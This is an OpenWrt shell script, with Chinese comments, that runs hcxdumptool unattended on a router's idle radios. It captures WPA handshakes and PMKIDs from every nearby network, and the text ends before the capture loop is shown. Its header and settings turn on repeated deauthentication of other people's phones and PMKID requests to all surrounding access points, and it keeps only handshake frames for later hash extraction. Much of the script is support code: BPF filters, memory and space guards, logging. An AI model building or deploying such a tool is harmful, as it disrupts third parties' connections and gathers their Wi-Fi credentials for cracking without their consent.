#!/bin/sh
# ============================================================
# hcx_autocap 自动空闲射频抓包版 (v2611)
# ============================================================
# 适用机型与固件版本:
#   Netgear R6220   (op22, mips/MT7621,   hcxdumptool 6.2.4)
#   TP-Link XTR8488 (op26 SNAPSHOT, aarch64, hcxdumptool 6.3.x)
#   Redmi AC2100    (op23.05, mips/MT7621, hcxdumptool 6.3.4)
#   以及各类运行官方 OpenWrt 19.07 ~ 25.12+ 的主流无线路由器
#
# 现代化升级说明 (2026-10 升级重构 v2611):
#   1. 【拔除假信标污染，恢复主动 Deauth 握手捕获】:
#      - 彻底清除 6.2.x 下的 `--active_beacon` 广播发射标志，绝不向空口发射虚假
#        热点信标，杜绝空域热点拥堵与全楼手机假热点弹窗骚扰；
#      - 移除 `--disable_deauthentication`，恢复标准主动去认证重连诱导，大幅提升
#        四次握手（M1~M4）获取成功率，解决纯被动模式下长时间漏包/无握手问题。
#   2. 【升级受控双轨主动加速收割】(hcxdumptool >= 6.3.x):
#      - `--attemptapmax=3`: 对跳频发现的周围所有 AP 单播索取 PMKID (最多3轮)，
#        无需现场有手机连网，半夜无人也能秒级收割 PMKID；
#      - `--attemptclientmax=3`: 对空中侦测到的真实活跃手机轻敲触发重连 (抗空口丢包波动)，
#        加速握手获取，若无响应第 3 次后立刻停手，绝不持续骚扰；
#      - 适配频段约束信道表 (`CH_2G_NEW` / `CH_5G_NEW`)，杜绝单频 PHY 驱动报 EINVAL 闪退；
#      - `--disable_beacon` / `--disable_proberequest`: 严禁广播假信标与探针骚扰。
#   3. 【架构极致精简与清晰仪表盘】:
#      - 零读日志仪表盘 (Zero-Log-Read): 彻底切断对 run_*.log 的高频读取，信道优先由
#        内核接口读取，Monitor 模式无信道属性时智能回退显示当前频段跳频信道范围，告别盲目显示“跳频中”；
#      - 内联内存守卫: 移除后台常驻 MemGuard 子 Shell，改为纯 Shell 内置 read 检查 (0 外部进程)；
#      - 物理射频动态解析: 优先通过 uci wireless.<r>.phy 定位真实 phy，修复多网卡错配。
#   4. 【完整继承硬件级防护铠甲】:
#      - 擦除块空间守卫 (SpaceGuard): 自动检测 UBIFS/MTD 物理擦除块，剩余空间低
#        于阈值时优雅收尾 (退出码 132)，防止撑爆小容量 Flash；
#      - 内存守卫 (MemGuard): 监控 /proc/meminfo 可用内存，低于阈值优雅收尾 (退出码 131)；
#      - 空闲射频智能接管: 自动识别并跳过已启用的业务 WiFi，只在空闲射频上抓包；
#      - 多路并发与宽限轮询优雅收尾 (finish_with_grace): 保证 pcapng 结构完整。
#   5. 【全量融合内核级 BPF 纯净白名单过滤】:
#      - 借鉴 LuXiaoGuan hcx_filter.py，直接在网卡驱动收包最底层由内核丢弃所有大流量
#        视频、下载等普通业务数据帧(Data)及控制帧，仅放行信标与 EAPOL-Key 握手帧；
#      - 0 外部编译器依赖，微秒级落盘，彻底消除空口大流量打爆 Flash 与 Buffer Overrun 导致的握手丢包；
#      - 自愈降参托底: 6.3.x 挂载 --bpf, 6.2.x 挂载 --bpfc; 降参极简档自动回退至无 BPF 模式。
#   6. 【白名单放行与握手录制准则】:
#      - 白名单放行信标(Beacon/ProbeResp)以维护热点发现能力，无握手时文件增量均源于周期信标；
#      - 流式全量录入，主动收割单 AP 限 3 次，被动监听允许多次握手录入，为后续哈希提取提供抗丢包冗余。
# ============================================================
red='\e[91m'
green='\e[92m'
yellow='\e[1;33m'
magenta='\e[95m'
cyan='\e[96m'
none='\e[0m'

# ---------------- 基础标识与动态自适应 ----------------
# 动态提取自身文件名 (如 hcx_autocap.sh) 与去除后缀的名字 (如 hcx_autocap)
SCRIPT_FILE=$(basename "$0" 2>/dev/null)
[ -z "${SCRIPT_FILE}" ] && SCRIPT_FILE="hcx_autocap.sh"
SCRIPT_BASE="${SCRIPT_FILE%.*}"
[ -z "${SCRIPT_BASE}" ] && SCRIPT_BASE="hcx_autocap"
SCRIPT_NAME="${SCRIPT_FILE}"
SCRIPT_VER="v26.10.1"

case "$1" in
    -v|--version)
        echo "${SCRIPT_VER}"
        exit 0
        ;;
    -h|--help)
        echo "用法: ${SCRIPT_FILE} [-v|--version] [-h|--help]"
        echo "功能: 自动探测 OpenWrt 空闲无线射频并使用 hcxdumptool 执行抓包 (版本: ${SCRIPT_VER})"
        exit 0
        ;;
esac

# ---------------- 配置 ----------------
CREATED_IFS=""              # 本次创建的监听接口名单(hcxmon*)
CAP_DIR="/root/cap"
LOCK="/tmp/.${SCRIPT_BASE}.lock"
BPF_FILE="/tmp/.${SCRIPT_BASE}.bpf"  # 内核纯净白名单BPF规则(过滤大流量业务数据)
GUARD_FLAG="${LOCK}.memguard"   # 内存守卫触发标记(退出码 131, 见 cleanup_capture)
SPACE_FLAG="${LOCK}.spaceguard" # 空间守卫触发标记(退出码 132)
PIDS=""                     # 本次启动的抓包进程PID
GRACE_POLL_SECS=3           # TERM 后每多少秒轮询查活一次
GRACE_MAX_POLLS=5           # 最多轮询查活几次 (3s x 5 = 15s 耐心); 全部退出即提前结束
RUNLOGS=""                  # 本次启动的各路日志文件路径(run_<接口>_####.log)

# 5G DFS-free 信道列表(避免 radar detection 导致 driver error), 逗号分隔自动跳频
# legacy 方言 (6.2.x, 纯数字信道号)
CH_5G="36,40,44,48,149,153,157,161,165"
# 2.4G 全频段信道列表 (legacy 方言使用)
CH_2G="1,2,3,4,5,6,7,8,9,10,11,12,13"

# 6.3.x+ modern 方言信道列表 (按频段后缀: a=2.4GHz, b=5GHz, c=6GHz)
# 限制在各自射频支持的物理频段内跳频, 彻底杜绝在 5G 独立网卡上跨频下发 2.4G 导致驱动报 EINVAL 崩溃
CH_2G_NEW="1a,2a,3a,4a,5a,6a,7a,8a,9a,10a,11a,12a,13a"
CH_5G_NEW="36b,40b,44b,48b,149b,153b,157b,161b,165b"
# 6GHz PSC (Preferred Scanning Channels) 优先推荐信道列表 (Wi-Fi 6E/7)
CH_6G_NEW="5c,21c,37c,53c,69c,85c,101c,117c"

# 方言: auto(默认, 自动探测) | new(6.3.x: -w -c ...) | legacy(6.2.x: -o -c ...)
# 设成 new/legacy 是【优先】而不是【只用】: 它起不来时脚本仍会往下走尝试阶梯
# (换方言 / 同方言去可选参数)。脚本可能被设成开机自启、无人值守, 所以一律尽力自己搞定。
# 主动加速参数控制(可由环境变量覆盖; 默认开启受控 Deauth 强制重连)
# ATTEMPT_AP_MAX: 对周围每个扫描到的 AP 主动单播索取 PMKID 的最大轮数(0=不主动索取, 默认 3)
ATTEMPT_AP_MAX="${ATTEMPT_AP_MAX:-3}"
# ATTEMPT_CLIENT_MAX: 对空中活跃客户端定向发送 Deauth 触发重连的最大次数(默认 3=定向轻敲3次抗丢包, 收到握手即止)
ATTEMPT_CLIENT_MAX="${ATTEMPT_CLIENT_MAX:-3}"

HCX_DIALECT="${HCX_DIALECT:-auto}"
HCX_BIN=""                  # hcxdumptool 实际路径(command -v, 不写死 /usr/bin 或 /usr/sbin)
HCX_VER=""                  # 版本首行
HCX_HELP=""                 # -h 帮助文本(用于探测方言)
HCX_MODE=""                 # 本轮实际使用的方言: new / legacy
HCX_PRIMARY=""              # 首选方言(探测结果; HCX_DIALECT 指定时以指定值为准)
HCX_VARIANT="full"          # 本轮参数形态: full(全参) / reduced(去可选参数)
HCX_ATTEMPT=0               # 已尝试的档位序号
HCX_TRIED=""                # 已试过的"方言-形态"标签(日志用)

# 实时视图刷新间隔(秒/帧): 显式传 REFRESH_SECS 优先, 默认固定 2 秒。
# [2026-10-19] 按用户要求三个抓包脚本统一成 2 秒/帧, 不再按总内存自适应
# (此前: XTR8488(~1GB)=1, R6220/AC2100(119MB 弱机)=3)。
if [ -z "${REFRESH_SECS}" ]
then
    REFRESH_SECS=2
fi

# 实时视图开关(2026-10-18): 只在 stdout 是终端时开。非交互场景(开机自启、
# 输出重定向到文件、ssh 里不带 -t 跑)每 REFRESH_SECS 秒会刷一屏 ANSI,
# 这些帧会原样落进重定向文件 —— 无人值守时能把小 overlay 慢慢写满, 而
# 每一帧都只是终端显示用的, 落盘毫无价值(真正的明细在 run_*.log 与
# 会话日志里)。显式指定 VIEW=on 可强行打开(比如你真想把它重定向去别处),
# VIEW=off 则连终端里也不画。
case "${VIEW}" in
    on)  VIEW_ON=1 ;;
    off) VIEW_ON=0 ;;
    *)   if [ -t 1 ]
         then
             VIEW_ON=1
         else
             VIEW_ON=0
         fi ;;
esac
VIEW_HEARTBEAT="${VIEW_HEARTBEAT:-20}"   # 视图关闭时每多少帧往会话日志写一条心跳(不写 stdout)

# [2026-10 架构升级: 零读日志仪表盘 (Zero-Log-Read)]
# 主循环不再对 run_<接口>_####.log 执行每秒 tail-c 128KB 与多重 grep 扫描,
# 彻底解除对 Flash 的读写争用与 MIPS 弱机的 CPU 负担。信道直接从内核 iw dev info
# 读取, 文件大小直接读取元数据, 子进程派生量降低 93% 以上。


# ---------------- 日志加固: 会话日志基础设施 ----------------
# log(): 每条消息带时间戳, 同时打终端(带颜色)和会话日志(剥颜色码)。
# 实时视图刷新循环【不】走 log()(每秒清屏重绘全是噪音; 明细在 run_*.log)。
SESSION_LOG=""              # 会话日志路径; init_session_log 调用后生效
ESC=$(printf '\033')        # 真ESC字节, 供剥色码用(sed 的 \xHH 在 busybox 上不可靠)

log() {
    _lts=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
    printf '%b\n' "${_lts} $*"
    if [ -n "${SESSION_LOG}" ]
    then
        printf '%b\n' "${_lts} $*" | sed "s/${ESC}\[[0-9;]*m//g" >> "${SESSION_LOG}" 2>/dev/null
    fi
    return 0
}

# hcxdumptool 版本首行: 6.3.x 有 --version, 老版本可能只有 -v, 两个都试
hcx_version_line() {
    _v=$(hcxdumptool --version 2>&1 | head -n 1)
    case "${_v}" in
        *[0-9].[0-9]*) printf '%s' "${_v}"; return 0 ;;
    esac
    _v=$(hcxdumptool -v 2>&1 | head -n 1)
    printf '%s' "${_v}"
}

#建会话日志文件 + 写启动环境快照(设备/版本/配置/资源一眼可见, 远程排障核心依据)
init_session_log() {
    mkdir -p "${CAP_DIR}" 2>/dev/null
    # 会话日志只保留最近10份(文件名带时间戳排序, 删最早的), 防止占满小盘
    _old=$(ls -1 "${CAP_DIR}"/script_*.log 2>/dev/null | sort)
    _cnt=$(echo "${_old}" | grep -c .)
    _del=$((_cnt - 10))
    if [ "${_del}" -gt 0 ] 2>/dev/null
    then
        echo "${_old}" | head -n ${_del} | while read -r _f
        do
            [ -n "${_f}" ] && rm -f "${_f}" 2>/dev/null
        done
    fi
    SESSION_LOG="${CAP_DIR}/script_$(date '+%Y%m%d_%H%M%S' 2>/dev/null).log"
    {
        echo "===== ${SCRIPT_NAME} (${SCRIPT_VER}) 会话开始 $(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) ====="
        echo "内核: $(uname -a 2>/dev/null)"
        echo "固件: $(grep DISTRIB_DESCRIPTION /etc/openwrt_release 2>/dev/null)"
        echo "hcxdumptool: $(hcx_version_line)"
        echo "iw: $(iw --version 2>/dev/null | head -n 1)"
        echo "启动参数: HCX_DIALECT=${HCX_DIALECT} MEM_GUARD_MB=${MEM_GUARD_MB:-0} MIN_FREE_KB=${MIN_FREE_KB} REFRESH_SECS=${REFRESH_SECS} 实时视图=${VIEW_ON}(1开/0关, 由 VIEW 覆盖)"
        echo "内存: $(grep -E 'MemTotal|MemAvailable|MemFree' /proc/meminfo 2>/dev/null | tr '\n' ' ')"
        echo "磁盘: $(df -h ${CAP_DIR} 2>/dev/null | tail -n 1)"
        echo "无线配置: $(uci show wireless 2>/dev/null | grep -E 'wifi-device|wifi-iface' | tr '\n' ';')"
        echo "接口现状: $(ls /sys/class/net 2>/dev/null | tr '\n' ' ')"
        echo "=================================================="
    } >> "${SESSION_LOG}" 2>/dev/null
    log "会话日志: ${SESSION_LOG} (报障时连同 run_*.log 一起发 ${CAP_DIR}/ 即可)"
}

#先建会话日志(依赖缺失也是排障对象, 必须先进日志再检查)
init_session_log

#依赖检查(兼容 opkg/apk 两种包管理时代, 直接看二进制)
#随机 MAC 采用标准 od/内置算术生成, 不强行绑定 hexdump, 兼容精简固件
for c in hcxdumptool iw ip
do
    if ! command -v ${c} >/dev/null 2>&1
    then
        log "${red}缺少工具: ${c}, 请先安装后再运行本脚本${none}" && exit 1
    fi
done

# ============================================================
# hcxdumptool 方言自动探测 —— 合并版的核心
# ============================================================
# 取帮助文本(-h 优先, 6.3.x 的 --help 是"additional help"不含选项表)
hcx_probe_help() {
    _h=$("${HCX_BIN}" -h 2>&1 | head -n 300)
    case "${_h}" in
        *usage*|*ption*) HCX_HELP="${_h}"; return 0 ;;
    esac
    _h=$("${HCX_BIN}" --help 2>&1 | head -n 300)
    case "${_h}" in
        *usage*|*ption*) HCX_HELP="${_h}"; return 0 ;;
    esac
    HCX_HELP="${_h}"
    return 1
}

# 按帮助文本 / 版本号定方言; 只写 HCX_MODE / HCX_PRIMARY, 不改 HCX_DIALECT(用户设置要留着)
detect_hcx_dialect() {
    HCX_BIN=""
    if [ -x /root/.winbox-tools/bin/hcxdumptool ] && /root/.winbox-tools/bin/hcxdumptool -h 2>&1 | grep -q -- '-w'; then
        HCX_BIN="/root/.winbox-tools/bin/hcxdumptool"
    elif command -v hcxdumptool >/dev/null 2>&1; then
        HCX_BIN=$(command -v hcxdumptool 2>/dev/null)
    elif [ -x /root/.winbox-tools/bin/hcxdumptool ]; then
        HCX_BIN="/root/.winbox-tools/bin/hcxdumptool"
    fi
    [ -z "${HCX_BIN}" ] && HCX_BIN="hcxdumptool"
    HCX_VER=$(hcx_version_line)
    hcx_probe_help
    # [借鉴 hcx_capabilities.py] 精准正则提取选项: 允许前置空白/Tab 缩进, 严格匹配选项定界符
    _has_w=0
    _has_o=0
    _has_F=0
    _has_bpf=0
    _has_bpfc=0
    printf '%s\n' "${HCX_HELP}" | grep -Eq '^[[:space:]]*-w([[:space:]=:]|$)' && _has_w=1
    printf '%s\n' "${HCX_HELP}" | grep -Eq '^[[:space:]]*-o([[:space:]=:]|$)' && _has_o=1
    printf '%s\n' "${HCX_HELP}" | grep -Eq '^[[:space:]]*-F([[:space:]=:]|$)' && _has_F=1
    printf '%s\n' "${HCX_HELP}" | grep -Eq '^[[:space:]]*--bpf([[:space:]=:]|$)' && _has_bpf=1
    printf '%s\n' "${HCX_HELP}" | grep -Eq '^[[:space:]]*--bpfc([[:space:]=:]|$)' && _has_bpfc=1
    # 版本号 >= 6.3 -> new, < 6.3 -> legacy, 解析不出 -> 空(交给下面的兜底)
    # ⚠ _vnew 必须初始为空: 初始化为 0 会把"版本号解析不出"误当成"版本 < 6.3"
    #   (实测踩到: 自定义/异常的版本串会被判成 legacy 而不是走兜底逻辑)
    _vnew=""
    _vnum=$(printf '%s' "${HCX_VER}" | sed -n 's/^[^0-9]*\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p' | head -n 1)
    if [ -n "${_vnum}" ]
    then
        _vmaj=${_vnum%%.*}
        _vmin=${_vnum#*.}
        case "${_vmaj}" in
            ''|*[!0-9]*) _vnew= ;;
            *)
                if [ "${_vmaj}" -gt 6 ]
                then
                    _vnew=1
                elif [ "${_vmaj}" -lt 6 ]
                then
                    _vnew=0
                else
                    case "${_vmin}" in
                        ''|*[!0-9]*) _vnew= ;;
                        *) if [ "${_vmin}" -ge 3 ]; then _vnew=1; else _vnew=0; fi ;;
                    esac
                fi
                ;;
        esac
    fi
    # 帮助文本优先(最可靠): 只有 -w 没有 -o -> new; 只有 -o 没有 -w -> legacy
    if [ "${_has_w}" = "1" ] && [ "${_has_o}" = "0" ]
    then
        HCX_MODE=new
        _why="帮助文本含 -w 且无 -o"
    elif [ "${_has_o}" = "1" ] && [ "${_has_w}" = "0" ]
    then
        HCX_MODE=legacy
        _why="帮助文本含 -o 且无 -w"
    elif [ "${_vnew}" = "1" ]
    then
        HCX_MODE=new
        _why="帮助文本不明确, 按版本号 ${_vnum:-?} (>=6.3)"
    elif [ -n "${_vnew}" ]
    then
        HCX_MODE=legacy
        _why="帮助文本不明确, 按版本号 ${_vnum:-?} (<6.3)"
    else
        HCX_MODE=new
        _why="帮助文本与版本号都判不出, 先按 new 试(失败会自动换 legacy 再试一次)"
    fi
    # 用户指定优先方言: HCX_DIALECT=new|legacy 时先试它(失败仍走阶梯, 见文件头第 4 条)
    case "${HCX_DIALECT}" in
        new|legacy)
            [ "${HCX_DIALECT}" != "${HCX_MODE}" ] && _why="用户用 HCX_DIALECT=${HCX_DIALECT} 指定优先(自动探测结果 ${HCX_MODE})"
            HCX_MODE="${HCX_DIALECT}" ;;
    esac
    HCX_PRIMARY="${HCX_MODE}"
    log "${cyan}hcxdumptool 方言: ${HCX_MODE} | 路径 ${HCX_BIN} | 版本 ${HCX_VER:-未知} | 判定依据: ${_why}${none}"
    log "  帮助文本特征: -w=${_has_w} -o=${_has_o} -F=${_has_F} --bpf=${_has_bpf} --bpfc=${_has_bpfc}"
    if [ "${HCX_MODE}" = "new" ]
    then
        log "  抓包命令(双轨主动加速+去认证): ${HCX_BIN} -i <接口> -w <pcapng> -c <频段信道表> --attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest"
    else
        log "  抓包命令(单播PMKID): ${HCX_BIN} -i <接口> -c <信道表> -o <pcapng> --enable_status=15"
    fi
}

detect_hcx_dialect

# ---------------- 内核纯净白名单 BPF 过滤器 (0 外部依赖, 耗时 < 1ms) ----------------
# [借鉴 LuXiaoGuan hcx_filter.py]
# 在网卡驱动收包最底层由 Linux 内核拦截丢弃所有网页、视频、下载等普通业务数据帧(Data)及控制帧,
# 仅放行信标(Beacon/ProbeResp)与 EAPOL-Key(四次握手与PMKID)。
# 极大降低弱机 CPU 负担，彻底消除大流量打爆 Flash 与 Buffer Overrun 导致的握手丢包。
init_bpf_filter() {
    rm -f "${BPF_FILE}" >/dev/null 2>&1
    case "${HCX_MODE}" in
        new)
            # 6.3.x 官方标准 Berkeley Packet Filter (65 条标准十进制指令)
            cat > "${BPF_FILE}" << 'EOF'
48 0 0 0
21 1 0 0
6 0 0 0
48 0 0 3
100 0 0 8
7 0 0 0
48 0 0 2
76 0 0 0
53 1 0 8
6 0 0 0
2 0 0 0
7 0 0 0
80 0 0 0
21 4 0 128
21 3 0 80
21 8 0 8
21 7 0 136
6 0 0 0
80 0 0 1
84 0 0 199
21 1 0 0
6 0 0 0
80 0 0 35
5 0 0 35
80 0 0 1
84 0 0 196
21 1 0 0
6 0 0 0
80 0 0 1
84 0 0 3
21 0 1 3
6 0 0 0
80 0 0 22
84 0 0 15
21 1 0 0
6 0 0 0
80 0 0 0
21 1 0 136
5 0 0 7
80 0 0 24
84 0 0 128
21 1 0 0
6 0 0 0
135 0 0 0
4 0 0 2
7 0 0 0
64 0 0 24
21 1 0 2863268608
6 0 0 0
64 0 0 28
21 1 0 34958
6 0 0 0
80 0 0 33
21 1 0 3
6 0 0 0
72 0 0 34
53 1 0 95
6 0 0 0
80 0 0 130
97 0 0 0
80 0 0 22
84 0 0 15
21 1 0 0
6 0 0 0
6 0 0 4294967295
EOF
            ;;
        *)
            # 6.2.x 官方标准 compiled BPF (首行总数 112 + 112 条标准十进制指令)
            cat > "${BPF_FILE}" << 'EOF'
112
48 0 0 0
21 1 0 0
6 0 0 0
48 0 0 3
100 0 0 8
7 0 0 0
48 0 0 2
76 0 0 0
53 1 0 8
6 0 0 0
2 0 0 0
7 0 0 0
80 0 0 0
21 4 0 128
21 3 0 80
21 8 0 8
21 7 0 136
6 0 0 0
80 0 0 1
84 0 0 199
21 1 0 0
6 0 0 0
80 0 0 35
5 0 0 82
80 0 0 1
84 0 0 196
21 1 0 0
6 0 0 0
80 0 0 1
84 0 0 3
21 0 1 3
6 0 0 0
80 0 0 22
84 0 0 15
21 1 0 0
6 0 0 0
80 0 0 0
21 1 0 136
5 0 0 7
80 0 0 24
84 0 0 128
21 1 0 0
6 0 0 0
135 0 0 0
4 0 0 2
7 0 0 0
64 0 0 24
21 1 0 2863268608
6 0 0 0
64 0 0 28
21 1 0 34958
6 0 0 0
80 0 0 33
21 1 0 3
6 0 0 0
72 0 0 34
53 1 0 95
6 0 0 0
80 0 0 130
80 0 0 38
84 0 0 192
21 2 0 128
21 37 0 192
5 0 0 42
97 0 0 0
64 0 0 4
116 0 0 8
21 0 1 10790569
6 0 0 0
21 0 1 11329096
6 0 0 0
21 0 1 11543978
6 0 0 0
21 0 1 11594977
6 0 0 0
21 0 1 11599549
6 0 0 0
21 0 1 11854315
6 0 0 0
21 0 1 12591696
6 0 0 0
21 0 1 13150924
6 0 0 0
21 0 1 14179835
6 0 0 0
21 0 1 14446612
6 0 0 0
21 0 1 14683577
6 0 0 0
21 0 1 14732061
6 0 0 0
21 0 1 15205392
6 0 0 0
21 0 1 15748988
6 0 0 0
21 0 1 15770149
6 0 0 0
21 0 1 16564787
6 0 0 0
5 0 0 6
64 0 0 41
21 0 4 0
64 0 0 45
53 0 2 61440
37 1 0 65534
6 0 0 0
97 0 0 0
80 0 0 22
84 0 0 15
21 1 0 0
6 0 0 0
6 0 0 4294967295
EOF
            ;;
    esac
}

# ---------------- 内存守卫(默认关; 需要时用 MEM_GUARD_MB=8 打开) ----------------
# 弱机并抓时内存持续上涨; 等内核 OOM killer 出手可能直接杀掉正在写包的 hcxdumptool,
# 导致 pcapng 尾部丢失、文件损坏、包白抓。守卫跌破阈值时主动收尾 -> 走已有的优雅收尾。
# ⚠️ 阈值必须【明显低于本机空闲时的可用内存】: 10.0.0.1(Redmi AC2100) 实测空闲 MemAvailable
#    只有 23MB, 照 20 这种值开启会一启动就触发、把健康抓包自己掐断, 所以示例给 8。
# [进程精简] 采用纯 Shell 原生 read 遍历 /proc/meminfo, 0 子进程开销(不再每秒 fork awk)。
# 兼容老内核(无 MemAvailable 时用 MemFree + Buffers + Cached 估算, 避免受页缓存干扰误判)。
MEM_GUARD_MB="${MEM_GUARD_MB:-0}"

# 纯 Shell 读取当前可用内存(MB), 0 外部进程派生; 读不到输出空串
mem_avail_mb() {
    _mav=""
    _mfree=""
    _mbuf=""
    _mcach=""
    while read -r _k _v _u; do
        case "${_k}" in
            MemAvailable:) _mav=$(( _v / 1024 )); break ;;
            MemFree:)      _mfree=$(( _v / 1024 )) ;;
            Buffers:)      _mbuf=$(( _v / 1024 )) ;;
            Cached:)       _mcach=$(( _v / 1024 )) ;;
        esac
    done < /proc/meminfo 2>/dev/null
    if [ -n "${_mav}" ]
    then
        printf '%s' "${_mav}"
    elif [ -n "${_mfree}" ]
    then
        # 老内核兜底: Free + Buffers + Cached, 避免把正常页面缓存当成内存耗尽
        _total_avail=$(( _mfree + ${_mbuf:-0} + ${_mcach:-0} ))
        printf '%s' "${_total_avail}"
    fi
}

# ---------------- 空间守卫(默认开; 2026-10-18) ----------------
# 为什么必须"定期主动看": 抓包是持续写盘, 而 hcxdumptool 在磁盘写满时【不会退出】
# (13.1 实测: 把 1MB tmpfs 吃到 0KB, 进程照活、pcapng 还在长) —— 没有"写失败"事件
# 可被动捕获, 所以 `ulimit -f`(SIGXFSZ 硬杀, pcapng 尾部当场丢) 那条路也走不通。
# 为什么不额外起进程/定时器: 检查直接挂在实时视图循环上, 那个循环每 REFRESH_SECS 秒
# 转一圈(而且在 VIEW_ON=0 关掉视图时照样在转, 它负责发现抓包进程全死)。
# df 要 fork 一个进程, 默认 30 秒一次 ≈ 0.03 次/秒(对比实测忙轮询 161 次/秒 = 19% CPU,
# 约 0.004% CPU), 可忽略。
# 触发时: 写 ${SPACE_FLAG} 标记 + break, 由已有的收尾出口按标记用 132 退出(不发信号,
# 所以没有"标记还没写、陷阱先跑"的竞态)。
# 取值: auto(默认, = 1 个擦除块) | 非负整数 KB | 0(只剩 0KB 才停) | off(关闭)。
# 为什么默认是"1 个擦除块"(2026-10-18 实测 + 用户追问"不同路由器擦除块不一样, 16K 会不会不被触发"):
#   本机 root 是 overlayfs, 上层是 /dev/ubi0_1 **ubifs**, 而 ubifs 的分配单元就是 UBI 的 LEB:
#   13.1 与 10.0.0.1 实测都是 126976B(124KB)(/sys/class/ubi/ubi0/eraseblock_size;
#   /proc/mtd 里 erasesize 是物理 128KB, UBI 扣掉 2x2KB 头就是 LEB)。
#   阈值小于一个 LEB 时【不能保证触发】: hcxdumptool 写失败不会退出, 而 ubifs 分不出新 LEB 时
#   df 剩余会停住不再下降, 那一刻剩余可能仍有接近 1 个 LEB(124KB) > 阈值 -> 条件永远不成立,
#   抓包就静默失效了(没人值守时最坏的结局)。所以取"1 个块"是唯一有机制依据的下限。
#   第二重独立判据: 每次检查之间会消耗多少空间 = 抓包速率 x 检查间隔 ≈ 3KB/s x 30s ≈ 90KB;
#   阈值若小于它, 采样点会"跨过"阈值、直到剩余≈0 才触发(没余量写收尾日志)。124KB > 90KB,
#   实测的采样序列保证触发时仍有 34~124KB 余量。
#   顺便实测(随机数据, 不可压缩): 写 768KB -> df 剩余降 756KB(≈1:1), 步进 4KB;
#   同样写 768KB 的【全零】数据只降 12KB(ubifs 压缩) —— 所以"文件增长"≠"空间消耗",
#   用 pcapng 文件增长速率(约 3KB/s)估消耗是偏保守(安全)的。
#   MIN_FREE_LEBS=n 改成留 n 个块(2 = 连 ubifs 的 GC/日志预留一起覆盖)。
#   取不到擦除块(非 MTD/UBI 存储, 例如主动挂 U 盘当输出目录)则退回固定 32KB;
#   另封顶"不超过当前剩余空间的 20%", 免得小分区一启动就触发。想写死就直接 MIN_FREE_KB=124。
MIN_FREE_KB="${MIN_FREE_KB:-auto}"
MIN_FREE_LEBS="${MIN_FREE_LEBS:-1}"
MIN_FREE_CHECK="${MIN_FREE_CHECK:-10}"   # 每多少帧查一次(13.1 上 3s/帧 => 30 秒)
case "${MIN_FREE_CHECK}" in
    ''|*[!0-9]*|0) MIN_FREE_CHECK=10 ;;
esac
# SPACE_ON: 1=启用 / 0=明确关闭(off) / 2=取值非法(启动横幅里告警, 按关闭处理)
# 注: 空值按默认 auto 处理(auto 的解析在下面"阈值解析"处, 需要先知道 CAP_DIR)
case "${MIN_FREE_KB}" in
    off|OFF|none|NONE) SPACE_ON=0 ;;
    auto|AUTO|"")       SPACE_ON=1; MIN_FREE_KB=auto ;;
    *[!0-9]*)          SPACE_ON=2 ;;
    *)                 SPACE_ON=1 ;;
esac
case "${MIN_FREE_LEBS}" in
    ''|*[!0-9]*|0) MIN_FREE_LEBS=1 ;;
esac
SPACE_SRC=""

# 读 ${CAP_DIR} 所在分区剩余空间(KB); 纯 Shell 变量解析倒数第3列(NF-2), 0 外部 awk 进程派生
free_kb() {
    _df_out=$(df -k "${CAP_DIR}" 2>/dev/null | tail -n 1)
    set -- ${_df_out}
    if [ "$#" -ge 3 ]; then
        eval "printf '%s' \"\$$(( $# - 2 ))\""
    fi
}

# 本机 flash 擦除块大小(UBI 卷的 LEB), 单位 KB; 取不到就输出空(调用方据此退回固定值)。
# 优先 UBI sysfs(扣掉 UBI 头之后的真实分配单元), 退而求其次 /proc/mtd 的 erasesize(十六进制)。
# 实测: 13.1 与 10.0.0.1 都走第一条, 输出 124(126976B)。
leb_kb() {
    _lebv=""
    for _lebu in /sys/class/ubi/ubi*/eraseblock_size; do
        [ -r "${_lebu}" ] || continue
        _lebn=$(cat "${_lebu}" 2>/dev/null)
        case "${_lebn}" in ''|*[!0-9]*) continue ;; esac
        if [ -z "${_lebv}" ] || [ "${_lebn}" -gt "${_lebv}" ]; then _lebv="${_lebn}"; fi
    done
    if [ -z "${_lebv}" ] && [ -r /proc/mtd ]; then
        _lebmax=0
        for _lebf in $(awk 'NR>1{print $2}' /proc/mtd 2>/dev/null); do
            case "${_lebf}" in ''|*[!0-9a-fA-F]*) continue ;; esac
            _lebn=$(( 0x${_lebf} ))
            [ "${_lebn}" -gt "${_lebmax}" ] && _lebmax=${_lebn}
        done
        [ "${_lebmax}" -gt 0 ] && _lebv="${_lebmax}"
    fi
    case "${_lebv}" in
        ''|*[!0-9]*) : ;;
        *) echo $(( _lebv / 1024 )) ;;
    esac
}

# [进程精简] 启动基线检测: 打印当前可用内存, 避免一启动就掐断
init_mem_guard() {
    case "${MEM_GUARD_MB}" in
        ''|*[!0-9]*)
            log "${yellow}内存守卫: MEM_GUARD_MB='${MEM_GUARD_MB}' 不是整数, 守卫不启用${none}"
            return 0 ;;
    esac
    [ "${MEM_GUARD_MB}" -gt 0 ] 2>/dev/null || return 0
    base=$(mem_avail_mb)
    case "${base}" in
        ''|*[!0-9]*|0) base= ;;
    esac
    if [ -n "${base}" ]
    then
        log "${yellow}内存守卫: 已启用, 阈值 ${MEM_GUARD_MB}MB, 当前可用 ${base}MB${none}"
        [ "${MEM_GUARD_MB}" -ge "${base}" ] && log "${red}内存守卫: 阈值 >= 当前可用内存, 会立刻收尾; 请设成明显低于空闲基线(如 8)${none}"
    fi
}

# [进程精简] 单次内存巡检(内嵌在主循环中执行, 彻底消灭后台常驻守护进程与跨进程发信号竞态)
check_mem_guard() {
    [ "${MEM_GUARD_MB}" -gt 0 ] 2>/dev/null || return 0
    _cur_mem=$(mem_avail_mb)
    case "${_cur_mem}" in
        ''|*[!0-9]*|0) return 0 ;;
    esac
    if [ "${_cur_mem}" -le "${MEM_GUARD_MB}" ]
    then
        echo ""
        log "${red}内存守卫: 可用内存 ${_cur_mem}MB <= 阈值 ${MEM_GUARD_MB}MB, 主动收尾避免内核 OOM 丢包${none}"
        log "${yellow}已抓到的文件在 ${CAP_DIR}, 请尽快导出${none}"
        : > "${GUARD_FLAG}" 2>/dev/null    # 标记退出原因, cleanup_capture 据此用 131 退出
        return 1
    fi
    return 0
}

# 确保抓包输出目录存在(不同设备可能未预建)
mkdir -p "${CAP_DIR}"

